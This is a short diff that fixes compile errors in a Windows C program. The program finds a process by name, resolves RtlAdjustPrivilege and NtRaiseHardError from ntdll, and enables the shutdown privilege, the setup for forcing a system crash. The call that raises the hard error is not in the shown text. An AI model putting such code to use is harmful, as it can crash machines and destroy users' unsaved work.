@@ -19,7 +19,7 @@ DWORD FindProcessId(char* processName)
         return 0;
 
     Process32First(processesSnapshot, &processInfo);
-    if (!strcmp(processName, processInfo.szExeFile))
+    if (!strcmp(processName, (const char*)processInfo.szExeFile))
     {
         CloseHandle(processesSnapshot);
         return processInfo.th32ProcessID;
@@ -27,7 +27,7 @@ DWORD FindProcessId(char* processName)
 
     while (Process32Next(processesSnapshot, &processInfo))
     {
-        if (!strcmp(processName, processInfo.szExeFile))
+        if (!strcmp(processName, (const char*)processInfo.szExeFile))
         {
             CloseHandle(processesSnapshot);
             return processInfo.th32ProcessID;
@@ -49,7 +49,7 @@ int main()
             BOOLEAN bEnabled;
             ULONG uResp;
             LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-            LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
+            LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
             pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
             pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
             NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
